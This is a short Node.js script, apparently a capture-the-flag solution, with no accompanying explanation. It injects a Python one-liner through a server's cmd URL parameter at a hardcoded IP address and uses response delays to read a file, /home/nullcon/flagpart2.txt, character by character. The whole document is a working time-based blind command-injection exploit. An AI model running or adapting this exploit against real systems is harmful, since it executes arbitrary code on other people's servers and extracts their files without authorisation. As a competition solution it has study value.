var cmd = "http://54.89.146.217/?cmd=python%20-c%20%22__import__(%27time%27).sleep(3%20if%20open(%27%2Fhome%2Fnullcon%2Fflagpart2.txt%27).read("
var cmd1 = ")%5B-1%5D%20%3D%3D%20%27"
var cmd2 = "%27%20else%200)%22"

var http = require("http");
var alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";

function searchAll(i) {
  search(0,i);
}

function search(i,j) {
  var start = new Date();
  process.stdout.write(alphabet.charAt(i));
  http.get(cmd+""+j+""+cmd1+alphabet.charAt(i)+cmd2, () => {
    var time = new Date() - start;
    if(time > 2500 || i+1 == alphabet.length) {
      console.log("   "+alphabet.charAt(i));
      searchAll(j+1);
    } else {
      search(i+1, j);
    }
  });
}
searchAll(1);
